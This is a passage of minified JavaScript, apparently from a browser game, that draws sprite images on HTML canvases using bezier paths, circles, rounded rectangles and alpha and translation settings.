                    r.bezierCurveTo(288 * e, 224 * e, 273 * e, 139 * e, 252 * e, 133 * e),
                    r.closePath(),
                    he(r, i[10], i[10], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(203 * e, 102 * e),
                    r.bezierCurveTo(204 * e, 136 * e, 200 * e, 159 * e, 189 * e, 174 * e),
                    r.bezierCurveTo(223 * e, 164 * e, 219 * e, 87 * e, 205 * e, 83 * e),
                    r.closePath(),
                    he(r, i[10], i[10], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(196 * e, 324 * e),
                    r.bezierCurveTo(209 * e, 239 * e, 200 * e, 219 * e, 192 * e, 196 * e),
                    r.bezierCurveTo(229 * e, 216 * e, 219 * e, 316 * e, 198 * e, 325 * e),
                    r.closePath(),
                    he(r, i[10], i[10], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(266 * e, 166 * e),
                    r.bezierCurveTo(249 * e, 154 * e, 243 * e, 161 * e, 233 * e, 167 * e),
                    he(r, void 0, i[6], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(269 * e, 192 * e),
                    r.bezierCurveTo(256 * e, 183 * e, 241 * e, 186 * e, 233 * e, 192 * e),
                    he(r, void 0, i[6], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(263 * e, 217 * e),
                    r.bezierCurveTo(251 * e, 211 * e, 242 * e, 213 * e, 236 * e, 218 * e),
                    he(r, void 0, i[6], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(204 * e, 141 * e),
                    r.bezierCurveTo(191 * e, 131 * e, 187 * e, 133 * e, 176 * e, 141 * e),
                    he(r, void 0, i[6], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(207 * e, 230 * e),
                    r.bezierCurveTo(193 * e, 222 * e, 185 * e, 224 * e, 177 * e, 231 * e),
                    he(r, void 0, i[6], 6 * e),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(210 * e, 258 * e),
                    r.bezierCurveTo(196 * e, 247 * e, 191 * e, 250 * e, 177 * e, 259 * e),
                    he(r, void 0, i[6], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(145 * e, 196 * e),
                    r.bezierCurveTo(130 * e, 186 * e, 124 * e, 187 * e, 114 * e, 195 * e),
                    he(r, void 0, i[6], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(218 * e, 97 * e),
                    r.bezierCurveTo(219 * e, 163 * e, 201 * e, 176 * e, 191 * e, 175 * e),
                    r.bezierCurveTo(176 * e, 177 * e, 168 * e, 167 * e, 160 * e, 115 * e),
                    r.closePath(),
                    he(r, void 0, i[6], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(224 * e, 181 * e),
                    r.bezierCurveTo(225 * e, 138 * e, 246 * e, 115 * e, 263 * e, 137 * e),
                    r.bezierCurveTo(282 * e, 174 * e, 279 * e, 217 * e, 265 * e, 243 * e),
                    r.bezierCurveTo(253 * e, 264 * e, 240 * e, 256 * e, 233 * e, 238 * e),
                    r.bezierCurveTo(221 * e, 212 * e, 225 * e, 198 * e, 224 * e, 184 * e),
                    r.closePath(),
                    he(r, void 0, i[6], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(169 * e, 289 * e),
                    r.bezierCurveTo(161 * e, 234 * e, 168 * e, 197 * e, 187 * e, 195 * e),
                    r.bezierCurveTo(219 * e, 189 * e, 222 * e, 256 * e, 216 * e, 307 * e),
                    r.closePath(),
                    he(r, void 0, i[6], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(143 * e, 146 * e),
                    r.bezierCurveTo(161 * e, 199 * e, 151 * e, 245 * e, 138 * e, 266 * e),
                    r.bezierCurveTo(120.5 * e, 239.5 * e, 120.5 * e, 239.5 * e, 103 * e, 213 * e),
                    r.closePath(),
                    he(r, void 0, i[6], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(283 * e, 135 * e),
                    r.bezierCurveTo(277 * e, 176 * e, 298 * e, 194 * e, 315 * e, 205 * e),
                    r.bezierCurveTo(323.5 * e, 175 * e, 323.5 * e, 175 * e, 332 * e, 145 * e),
                    r.closePath(),
                    he(r, void 0, i[6], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(318 * e, 223 * e),
                    r.bezierCurveTo(290 * e, 195 * e, 271 * e, 256 * e, 283 * e, 281 * e),
                    r.bezierCurveTo(303.5 * e, 267 * e, 303.5 * e, 267 * e, 324 * e, 253 * e),
                    r.closePath(),
                    he(r, void 0, i[6], 6 * e),
                    ke(r, 222 * e, 199 * e, 120.74767078498864 * e),
                    he(r, void 0, i[3], 40 * e),
                    ke(r, 220 * e, 200 * e, 95.44108130150245 * e),
                    he(r, void 0, i[2], 15 * e),
                    ke(r, 220 * e, 201 * e, 85 * e),
                    he(r, void 0, i[4], 10 * e),
                    r.globalAlpha = .5,
                    ke(r, 220 * e, 201 * e, 82 * e),
                    he(r, i[9]),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(5 * e, 5 * e),
                    ke(r, 63 * e, 136 * e, 49.193495504995376 * e),
                    he(r, i[0], i[0], 4 * e),
                    r.globalAlpha = 1,
                    r.translate(-5 * e, -5 * e),
                    ke(r, 63 * e, 136 * e, 49.193495504995376 * e),
                    he(r, i[8], i[2], 4 * e),
                    ke(r, 63 * e, 137 * e, 25.632011235952593 * e),
                    he(r, i[7], i[2], 4 * e),
                    n
            }
            function o0(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 110 * e,
                    i.height = 110 * e,
                    n.globalAlpha = .2,
                    ke(n, 55 * e, 55 * e, 55 * e),
                    he(n, t[0]),
                    i
            }
            function a0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 102 * e,
                    n.height = 102 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(3, 3),
                    Ve(r, 24 * e, 26 * e, 70 * e, 9 * e, 10 * e),
                    he(r, i[0]),
                    Ve(r, 26 * e, 70 * e, 70 * e, 9 * e, 10 * e),
                    he(r, i[0]),
                    Ve(r, 5 * e, 3 * e, 22 * e, 94 * e, 5 * e),
                    he(r, i[0]),
                    Ve(r, 40 * e, 3 * e, 22 * e, 94 * e, 5 * e),
                    he(r, i[0]),
                    Ve(r, 75 * e, 3 * e, 22 * e, 94 * e, 5 * e),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-3, -3),
                    Ve(r, 24 * e, 26 * e, 70 * e, 9 * e, 10 * e),
                    he(r, i[1]),
                    Ve(r, 26 * e, 70 * e, 70 * e, 9 * e, 10 * e),
                    he(r, i[1]),
                    Ve(r, 5 * e, 3 * e, 22 * e, 94 * e, 5 * e),
                    he(r, i[2], i[3], 4 * e),
                    Ve(r, 40 * e, 3 * e, 22 * e, 94 * e, 5 * e),
                    he(r, i[2], i[3], 4 * e),
                    Ve(r, 75 * e, 3 * e, 22 * e, 94 * e, 5 * e),
                    he(r, i[2], i[3], 4 * e),
                    n
            }
            function s0(e, t, i) {
                var n, r, o, a = document.createElement("canvas"), s = a.getContext("2d"), _ = (a.width = 496 * e,
                    a.height = 520 * e,
                    s.globalAlpha = t ? .5 : 1,
                    s.translate(0, 10 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(19.000030517578125 * e, 256.67613983154297 * e),
                    s.bezierCurveTo(1.000030517578125 * e, 332.67613983154297 * e, 23.000030517578125 * e, 404.67613983154297 * e, 95.00003051757812 * e, 463.67613983154297 * e),
                    s.bezierCurveTo(128.00003051757812 * e, 491.67613983154297 * e, 165.00003051757812 * e, 507.67613983154297 * e, 194.00003051757812 * e, 512.676139831543 * e),
                    s.bezierCurveTo(280.0000305175781 * e, 517.676139831543 * e, 291.0000305175781 * e, 516.676139831543 * e, 342.0000305175781 * e, 497.67613983154297 * e),
                    s.bezierCurveTo(425.0000305175781 * e, 454.67613983154297 * e, 469.0000305175781 * e, 392.67613983154297 * e, 468.0000305175781 * e, 300.67613983154297 * e),
                    s.bezierCurveTo(408.5000305175781 * e, 365.17613983154297 * e, 408.5000305175781 * e, 365.17613983154297 * e, 349.0000305175781 * e, 429.67613983154297 * e),
                    s.bezierCurveTo(256.0000305175781 * e, 473.67613983154297 * e, 167.00003051757812 * e, 459.67613983154297 * e, 78.00003051757812 * e, 384.67613983154297 * e),
                    s.closePath(),
                    he(s, i[0]),
                    s.globalAlpha = 1,
                    s.translate(0, -10 * e),
                    ke(s, 247.01138305664062 * e, 249.3125 * e, 161.4465855941215 * e),
                    he(s, i[5], void 0, 12 * e),
                    s.globalAlpha = t ? .5 : 1,
                    s.translate(0, 10 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(65.00003051757812 * e, 263.4034118652344 * e),
                    s.bezierCurveTo(109.00003051757812 * e, 160.40341186523438 * e, 185.00003051757812 * e, 128.40341186523438 * e, 222.00003051757812 * e, 124.40341186523438 * e),
                    s.bezierCurveTo(277.0000305175781 * e, 116.40341186523438 * e, 339.0000305175781 * e, 134.40341186523438 * e, 379.0000305175781 * e, 195.40341186523438 * e),
                    s.bezierCurveTo(409.0000305175781 * e, 242.40341186523438 * e, 416.0000305175781 * e, 256.4034118652344 * e, 428.0000305175781 * e, 304.4034118652344 * e),
                    s.bezierCurveTo(457.0000305175781 * e, 203.40341186523438 * e, 449.0000305175781 * e, 183.40341186523438 * e, 438.0000305175781 * e, 162.40341186523438 * e),
                    s.bezierCurveTo(381.0000305175781 * e, 73.40341186523438 * e, 360.0000305175781 * e, 66.40341186523438 * e, 257.0000305175781 * e, 46.403411865234375 * e),
                    s.bezierCurveTo(191.00003051757812 * e, 45.403411865234375 * e, 142.00003051757812 * e, 65.40341186523438 * e, 101.00003051757812 * e, 115.40341186523438 * e),
                    s.closePath(),
                    he(s, i[0]),
                    s.globalAlpha = 1,
                    n = e,
                    _ = i,
                    r = document.createElement("canvas"),
                    o = r.getContext("2d"),
                    r.width = 496 * n,
                    r.height = 520 * n,
                    o.globalAlpha = 1,
                    o.translate(0, -10 * n),
                    ke(o, 247.01138305664062 * n, 250.13068389892578 * n, 232.81967270830015 * n),
                    he(o, _[1], _[2], 14 * n),
                    o.globalCompositeOperation = "destination-out",
                    ke(o, 247.01138305664062 * n, 249.3125 * n, 161.4465855941215 * n),
                    he(o, _[0], _[0], 14 * n),
                    o.globalCompositeOperation = "source-over",
                    r);
                return s.drawImage(_, 0, 0),
                    s.translate(0, -10 * e),
                    ke(s, 247.01138305664062 * e, 249.3125 * e, 161.4465855941215 * e),
                    he(s, void 0, i[2], 12 * e),
                    s.globalAlpha = t ? .5 : 1,
                    s.translate(0, 5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(325.0113830566406 * e, 13.767059326171875 * e),
                    s.bezierCurveTo(349.5113830566406 * e, 25.767059326171875 * e, 349.5113830566406 * e, 25.767059326171875 * e, 374.0113830566406 * e, 37.767059326171875 * e),
                    s.bezierCurveTo(384.0113830566406 * e, 44.767059326171875 * e, 383.0113830566406 * e, 50.767059326171875 * e, 368.0113830566406 * e, 68.76705932617188 * e),
                    s.bezierCurveTo(352.5113830566406 * e, 91.26705932617188 * e, 352.5113830566406 * e, 91.26705932617188 * e, 337.0113830566406 * e, 113.76705932617188 * e),
                    s.bezierCurveTo(328.0113830566406 * e, 119.76705932617188 * e, 328.0113830566406 * e, 121.76705932617188 * e, 312.0113830566406 * e, 112.76705932617188 * e),
                    s.bezierCurveTo(303.0113830566406 * e, 108.26705932617188 * e, 303.0113830566406 * e, 108.26705932617188 * e, 294.0113830566406 * e, 103.76705932617188 * e),
                    s.bezierCurveTo(287.0113830566406 * e, 99.76705932617188 * e, 293.0113830566406 * e, 84.76705932617188 * e, 297.0113830566406 * e, 67.76705932617188 * e),
                    s.bezierCurveTo(302.0113830566406 * e, 47.767059326171875 * e, 302.0113830566406 * e, 47.767059326171875 * e, 307.0113830566406 * e, 27.767059326171875 * e),
                    s.bezierCurveTo(310.0113830566406 * e, 15.767059326171875 * e, 317.0113830566406 * e, 12.767059326171875 * e, 323.0113830566406 * e, 13.767059326171875 * e),
                    s.closePath(),
                    he(s, i[0], i[0], 12 * e),
                    s.globalAlpha = 1,
                    s.translate(0, -5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(325.0113830566406 * e, 13.767059326171875 * e),
                    s.bezierCurveTo(349.5113830566406 * e, 25.767059326171875 * e, 349.5113830566406 * e, 25.767059326171875 * e, 374.0113830566406 * e, 37.767059326171875 * e),
                    s.bezierCurveTo(384.0113830566406 * e, 44.767059326171875 * e, 383.0113830566406 * e, 50.767059326171875 * e, 368.0113830566406 * e, 68.76705932617188 * e),
                    s.bezierCurveTo(352.5113830566406 * e, 91.26705932617188 * e, 352.5113830566406 * e, 91.26705932617188 * e, 337.0113830566406 * e, 113.76705932617188 * e),
                    s.bezierCurveTo(328.0113830566406 * e, 119.76705932617188 * e, 328.0113830566406 * e, 121.76705932617188 * e, 312.0113830566406 * e, 112.76705932617188 * e),
                    s.bezierCurveTo(303.0113830566406 * e, 108.26705932617188 * e, 303.0113830566406 * e, 108.26705932617188 * e, 294.0113830566406 * e, 103.76705932617188 * e),
                    s.bezierCurveTo(287.0113830566406 * e, 99.76705932617188 * e, 293.0113830566406 * e, 84.76705932617188 * e, 297.0113830566406 * e, 67.76705932617188 * e),
                    s.bezierCurveTo(302.0113830566406 * e, 47.767059326171875 * e, 302.0113830566406 * e, 47.767059326171875 * e, 307.0113830566406 * e, 27.767059326171875 * e),
                    s.bezierCurveTo(310.0113830566406 * e, 15.767059326171875 * e, 317.0113830566406 * e, 12.767059326171875 * e, 323.0113830566406 * e, 13.767059326171875 * e),
                    s.closePath(),
                    he(s, i[3], i[2], 12 * e),
                    s.globalAlpha = t ? .5 : 1,
                    s.translate(0, 5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(403.0113830566406 * e, 89.76705932617188 * e),
                    s.bezierCurveTo(413.0113830566406 * e, 76.76705932617188 * e, 418.0113830566406 * e, 79.76705932617188 * e, 428.0113830566406 * e, 92.76705932617188 * e),
                    s.bezierCurveTo(435.0113830566406 * e, 99.76705932617188 * e, 435.0113830566406 * e, 99.76705932617188 * e, 442.0113830566406 * e, 106.76705932617188 * e),
                    s.bezierCurveTo(450.0113830566406 * e, 116.76705932617188 * e, 445.0113830566406 * e, 119.76705932617188 * e, 433.0113830566406 * e, 128.76705932617188 * e),
                    s.bezierCurveTo(408.0113830566406 * e, 146.26705932617188 * e, 408.0113830566406 * e, 146.26705932617188 * e, 383.0113830566406 * e, 163.76705932617188 * e),
                    s.bezierCurveTo(376.0113830566406 * e, 166.76705932617188 * e, 377.0113830566406 * e, 165.76705932617188 * e, 368.0113830566406 * e, 156.76705932617188 * e),
                    s.bezierCurveTo(359.0113830566406 * e, 144.76705932617188 * e, 359.0113830566406 * e, 142.76705932617188 * e, 367.0113830566406 * e, 133.76705932617188 * e),
                    s.closePath(),
                    he(s, i[0], i[0], 12 * e),
                    s.globalAlpha = 1,
                    s.translate(0, -5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(403.0113830566406 * e, 89.76705932617188 * e),
                    s.bezierCurveTo(413.0113830566406 * e, 76.76705932617188 * e, 418.0113830566406 * e, 79.76705932617188 * e, 428.0113830566406 * e, 92.76705932617188 * e),
                    s.bezierCurveTo(435.0113830566406 * e, 99.76705932617188 * e, 435.0113830566406 * e, 99.76705932617188 * e, 442.0113830566406 * e, 106.76705932617188 * e),
                    s.bezierCurveTo(450.0113830566406 * e, 116.76705932617188 * e, 445.0113830566406 * e, 119.76705932617188 * e, 433.0113830566406 * e, 128.76705932617188 * e),
                    s.bezierCurveTo(408.0113830566406 * e, 146.26705932617188 * e, 408.0113830566406 * e, 146.26705932617188 * e, 383.0113830566406 * e, 163.76705932617188 * e),
                    s.bezierCurveTo(376.0113830566406 * e, 166.76705932617188 * e, 377.0113830566406 * e, 165.76705932617188 * e, 368.0113830566406 * e, 156.76705932617188 * e),
                    s.bezierCurveTo(359.0113830566406 * e, 144.76705932617188 * e, 359.0113830566406 * e, 142.76705932617188 * e, 367.0113830566406 * e, 133.76705932617188 * e),
                    s.closePath(),
                    he(s, i[4], i[2], 12 * e),
                    s.globalAlpha = t ? .5 : 1,
                    s.translate(0, 5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(228.01138305664062 * e, 1.767059326171875 * e),
                    s.bezierCurveTo(246.51138305664062 * e, 3.267059326171875 * e, 246.51138305664062 * e, 3.267059326171875 * e, 265.0113830566406 * e, 4.767059326171875 * e),
                    s.bezierCurveTo(273.0113830566406 * e, 5.767059326171875 * e, 275.0113830566406 * e, 11.767059326171875 * e, 270.0113830566406 * e, 27.767059326171875 * e),
                    s.bezierCurveTo(264.0113830566406 * e, 54.267059326171875 * e, 264.0113830566406 * e, 54.267059326171875 * e, 258.0113830566406 * e, 80.76705932617188 * e),
                    s.bezierCurveTo(256.0113830566406 * e, 92.76705932617188 * e, 256.0113830566406 * e, 94.76705932617188 * e, 242.01138305664062 * e, 93.76705932617188 * e),
                    s.bezierCurveTo(226.01138305664062 * e, 95.76705932617188 * e, 225.01138305664062 * e, 91.76705932617188 * e, 225.01138305664062 * e, 80.76705932617188 * e),
                    s.bezierCurveTo(223.51138305664062 * e, 50.267059326171875 * e, 223.51138305664062 * e, 50.267059326171875 * e, 222.01138305664062 * e, 19.767059326171875 * e),
                    s.bezierCurveTo(219.01138305664062 * e, 8.767059326171875 * e, 224.01138305664062 * e, 4.767059326171875 * e, 227.01138305664062 * e, 2.767059326171875 * e),
                    s.closePath(),
                    he(s, i[0], i[0], 12 * e),
                    s.globalAlpha = 1,
                    s.translate(0, -5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(228.01138305664062 * e, 1.767059326171875 * e),
                    s.bezierCurveTo(246.51138305664062 * e, 3.267059326171875 * e, 246.51138305664062 * e, 3.267059326171875 * e, 265.0113830566406 * e, 4.767059326171875 * e),
                    s.bezierCurveTo(273.0113830566406 * e, 5.767059326171875 * e, 275.0113830566406 * e, 11.767059326171875 * e, 270.0113830566406 * e, 27.767059326171875 * e),
                    s.bezierCurveTo(264.0113830566406 * e, 54.267059326171875 * e, 264.0113830566406 * e, 54.267059326171875 * e, 258.0113830566406 * e, 80.76705932617188 * e),
                    s.bezierCurveTo(256.0113830566406 * e, 92.76705932617188 * e, 256.0113830566406 * e, 94.76705932617188 * e, 242.01138305664062 * e, 93.76705932617188 * e),
                    s.bezierCurveTo(226.01138305664062 * e, 95.76705932617188 * e, 225.01138305664062 * e, 91.76705932617188 * e, 225.01138305664062 * e, 80.76705932617188 * e),
                    s.bezierCurveTo(223.51138305664062 * e, 50.267059326171875 * e, 223.51138305664062 * e, 50.267059326171875 * e, 222.01138305664062 * e, 19.767059326171875 * e),
                    s.bezierCurveTo(219.01138305664062 * e, 8.767059326171875 * e, 224.01138305664062 * e, 4.767059326171875 * e, 227.01138305664062 * e, 2.767059326171875 * e),
                    s.closePath(),
                    he(s, i[4], i[2], 12 * e),
                    s.globalAlpha = t ? .5 : 1,
                    s.translate(0, 5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(142.01138305664062 * e, 25.767059326171875 * e),
                    s.bezierCurveTo(158.51138305664062 * e, 19.767059326171875 * e, 158.51138305664062 * e, 19.767059326171875 * e, 175.01138305664062 * e, 13.767059326171875 * e),
                    s.bezierCurveTo(188.01138305664062 * e, 11.767059326171875 * e, 188.01138305664062 * e, 16.767059326171875 * e, 191.01138305664062 * e, 29.767059326171875 * e),
                    s.bezierCurveTo(197.01138305664062 * e, 60.267059326171875 * e, 197.01138305664062 * e, 60.267059326171875 * e, 203.01138305664062 * e, 90.76705932617188 * e),
                    s.bezierCurveTo(206.01138305664062 * e, 102.76705932617188 * e, 196.01138305664062 * e, 99.76705932617188 * e, 181.01138305664062 * e, 105.76705932617188 * e),
                    s.bezierCurveTo(175.01138305664062 * e, 108.76705932617188 * e, 172.01138305664062 * e, 104.76705932617188 * e, 164.01138305664062 * e, 84.76705932617188 * e),
                    s.bezierCurveTo(152.51138305664062 * e, 63.267059326171875 * e, 152.51138305664062 * e, 63.267059326171875 * e, 141.01138305664062 * e, 41.767059326171875 * e),
                    s.bezierCurveTo(138.01138305664062 * e, 35.767059326171875 * e, 138.01138305664062 * e, 29.767059326171875 * e, 141.01138305664062 * e, 27.767059326171875 * e),
                    s.closePath(),
                    he(s, i[0], i[0], 12 * e),
                    s.globalAlpha = 1,
                    s.translate(0, -5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(142.01138305664062 * e, 25.767059326171875 * e),
                    s.bezierCurveTo(158.51138305664062 * e, 19.767059326171875 * e, 158.51138305664062 * e, 19.767059326171875 * e, 175.01138305664062 * e, 13.767059326171875 * e),
                    s.bezierCurveTo(188.01138305664062 * e, 11.767059326171875 * e, 188.01138305664062 * e, 16.767059326171875 * e, 191.01138305664062 * e, 29.767059326171875 * e),
                    s.bezierCurveTo(197.01138305664062 * e, 60.267059326171875 * e, 197.01138305664062 * e, 60.267059326171875 * e, 203.01138305664062 * e, 90.76705932617188 * e),
                    s.bezierCurveTo(206.01138305664062 * e, 102.76705932617188 * e, 196.01138305664062 * e, 99.76705932617188 * e, 181.01138305664062 * e, 105.76705932617188 * e),
                    s.bezierCurveTo(175.01138305664062 * e, 108.76705932617188 * e, 172.01138305664062 * e, 104.76705932617188 * e, 164.01138305664062 * e, 84.76705932617188 * e),
                    s.bezierCurveTo(152.51138305664062 * e, 63.267059326171875 * e, 152.51138305664062 * e, 63.267059326171875 * e, 141.01138305664062 * e, 41.767059326171875 * e),
                    s.bezierCurveTo(138.01138305664062 * e, 35.767059326171875 * e, 138.01138305664062 * e, 29.767059326171875 * e, 141.01138305664062 * e, 27.767059326171875 * e),
                    s.closePath(),
                    he(s, i[4], i[2], 12 * e),
                    s.globalAlpha = t ? .5 : 1,
                    s.translate(0, 5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(70.01138305664062 * e, 76.76705932617188 * e),
                    s.bezierCurveTo(83.01138305664062 * e, 64.26705932617188 * e, 83.01138305664062 * e, 64.26705932617188 * e, 96.01138305664062 * e, 51.767059326171875 * e),
                    s.bezierCurveTo(104.01138305664062 * e, 44.767059326171875 * e, 110.01138305664062 * e, 51.767059326171875 * e, 119.01138305664062 * e, 66.76705932617188 * e),
                    s.bezierCurveTo(135.01138305664062 * e, 88.26705932617188 * e, 135.01138305664062 * e, 88.26705932617188 * e, 151.01138305664062 * e, 109.76705932617188 * e),
                    s.bezierCurveTo(157.01138305664062 * e, 119.76705932617188 * e, 153.01138305664062 * e, 122.76705932617188 * e, 147.01138305664062 * e, 129.76705932617188 * e),
                    s.bezierCurveTo(138.01138305664062 * e, 140.76705932617188 * e, 136.01138305664062 * e, 140.76705932617188 * e, 122.01138305664062 * e, 127.76705932617188 * e),
                    s.bezierCurveTo(99.51138305664062 * e, 110.26705932617188 * e, 99.51138305664062 * e, 110.26705932617188 * e, 77.01138305664062 * e, 92.76705932617188 * e),
                    s.bezierCurveTo(66.01138305664062 * e, 83.76705932617188 * e, 66.01138305664062 * e, 82.76705932617188 * e, 69.01138305664062 * e, 78.76705932617188 * e),
                    s.closePath(),
                    he(s, i[0], i[0], 12 * e),
                    s.globalAlpha = 1,
                    s.translate(0, -5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(70.01138305664062 * e, 76.76705932617188 * e),
                    s.bezierCurveTo(83.01138305664062 * e, 64.26705932617188 * e, 83.01138305664062 * e, 64.26705932617188 * e, 96.01138305664062 * e, 51.767059326171875 * e),
                    s.bezierCurveTo(104.01138305664062 * e, 44.767059326171875 * e, 110.01138305664062 * e, 51.767059326171875 * e, 119.01138305664062 * e, 66.76705932617188 * e),
                    s.bezierCurveTo(135.01138305664062 * e, 88.26705932617188 * e, 135.01138305664062 * e, 88.26705932617188 * e, 151.01138305664062 * e, 109.76705932617188 * e),
                    s.bezierCurveTo(157.01138305664062 * e, 119.76705932617188 * e, 153.01138305664062 * e, 122.76705932617188 * e, 147.01138305664062 * e, 129.76705932617188 * e),
                    s.bezierCurveTo(138.01138305664062 * e, 140.76705932617188 * e, 136.01138305664062 * e, 140.76705932617188 * e, 122.01138305664062 * e, 127.76705932617188 * e),
                    s.bezierCurveTo(99.51138305664062 * e, 110.26705932617188 * e, 99.51138305664062 * e, 110.26705932617188 * e, 77.01138305664062 * e, 92.76705932617188 * e),
                    s.bezierCurveTo(66.01138305664062 * e, 83.76705932617188 * e, 66.01138305664062 * e, 82.76705932617188 * e, 69.01138305664062 * e, 78.76705932617188 * e),
                    s.closePath(),
                    he(s, i[4], i[2], 12 * e),
                    s.globalAlpha = t ? .5 : 1,
                    s.translate(0, 5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(33.011383056640625 * e, 126.76705932617188 * e),
                    s.bezierCurveTo(22.011383056640625 * e, 149.76705932617188 * e, 22.011383056640625 * e, 149.76705932617188 * e, 11.011383056640625 * e, 172.76705932617188 * e),
                    s.bezierCurveTo(7.011383056640625 * e, 184.76705932617188 * e, 11.011383056640625 * e, 189.76705932617188 * e, 36.011383056640625 * e, 195.76705932617188 * e),
                    s.bezierCurveTo(61.011383056640625 * e, 202.26705932617188 * e, 61.011383056640625 * e, 202.26705932617188 * e, 86.01138305664062 * e, 208.76705932617188 * e),
                    s.bezierCurveTo(100.01138305664062 * e, 214.76705932617188 * e, 102.01138305664062 * e, 203.76705932617188 * e, 109.01138305664062 * e, 189.76705932617188 * e),
                    s.bezierCurveTo(117.01138305664062 * e, 171.76705932617188 * e, 116.01138305664062 * e, 166.76705932617188 * e, 97.01138305664062 * e, 156.76705932617188 * e),
                    s.bezierCurveTo(74.01138305664062 * e, 140.76705932617188 * e, 74.01138305664062 * e, 140.76705932617188 * e, 51.011383056640625 * e, 124.76705932617188 * e),
                    s.bezierCurveTo(42.011383056640625 * e, 118.76705932617188 * e, 37.011383056640625 * e, 119.76705932617188 * e, 33.011383056640625 * e, 126.76705932617188 * e),
                    s.closePath(),
                    he(s, i[0], i[0], 12 * e),
                    s.globalAlpha = 1,
                    s.translate(0, -5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(33.011383056640625 * e, 126.76705932617188 * e),
                    s.bezierCurveTo(22.011383056640625 * e, 149.76705932617188 * e, 22.011383056640625 * e, 149.76705932617188 * e, 11.011383056640625 * e, 172.76705932617188 * e),
                    s.bezierCurveTo(7.011383056640625 * e, 184.76705932617188 * e, 11.011383056640625 * e, 189.76705932617188 * e, 36.011383056640625 * e, 195.76705932617188 * e),
                    s.bezierCurveTo(61.011383056640625 * e, 202.26705932617188 * e, 61.011383056640625 * e, 202.26705932617188 * e, 86.01138305664062 * e, 208.76705932617188 * e),
                    s.bezierCurveTo(100.01138305664062 * e, 214.76705932617188 * e, 102.01138305664062 * e, 203.76705932617188 * e, 109.01138305664062 * e, 189.76705932617188 * e),
                    s.bezierCurveTo(117.01138305664062 * e, 171.76705932617188 * e, 116.01138305664062 * e, 166.76705932617188 * e, 97.01138305664062 * e, 156.76705932617188 * e),
                    s.bezierCurveTo(74.01138305664062 * e, 140.76705932617188 * e, 74.01138305664062 * e, 140.76705932617188 * e, 51.011383056640625 * e, 124.76705932617188 * e),
                    s.bezierCurveTo(42.011383056640625 * e, 118.76705932617188 * e, 37.011383056640625 * e, 119.76705932617188 * e, 33.011383056640625 * e, 126.76705932617188 * e),
                    s.closePath(),
                    he(s, i[3], i[2], 12 * e),
                    s.globalAlpha = t ? .5 : 1,
                    s.translate(0, 5 * e),
                    s.beginPath(),
                    s.lineCap = "round",
                    s.lineJoin = "round",
                    s.moveTo(13.011383056640625 * e, 229.76705932617188 * e),
                    s.bezierCurveTo(45.511383056640625 * e, 233.76705932617188 * e, 45.511383056640625 * e, 233.76705932617188 * e, 78.01138305664062 * e, 237.76705932617188 * e),
                    s.bezierCurveTo(92.01138305664062 * e, 239.76705932617188 * e, 92.01138305664062 * e, 246.76705932617188 * e, 91.01138305664062 * e, 257.7670593261719 * e),
                    s.bezierCurveTo(92.01138305664062 * e, 275.7670593261719 * e, 91.01138305664062 * e, 274.7670593261719 * e, 68.01138305664062 * e, 276.7670593261719 * e),
                    s.bezierCurveTo(42.511383056640625 * e, 279.7670593261719 * e, 42.511383056640625 * e, 279.7670593261719 * e, 17.011383056640625 * e, 282.7670593261719 * e),
                    s.bezierCurveTo(2.011383056640625 * e, 282.7670593261719 * e, 3.011383056640625 * e, 276.7670593261719 * e, 2.011383056640625 * e, 260.7670593261719 * e),
